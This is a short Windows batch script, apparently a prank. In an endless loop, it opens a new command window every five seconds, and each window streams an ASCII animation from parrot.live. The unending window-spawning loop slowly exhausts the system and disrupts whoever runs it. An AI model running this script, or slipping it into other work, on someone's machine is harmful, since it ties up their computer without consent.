@echo off
:loop
start cmd /k "curl parrot.live"
timeout /t 5
goto loop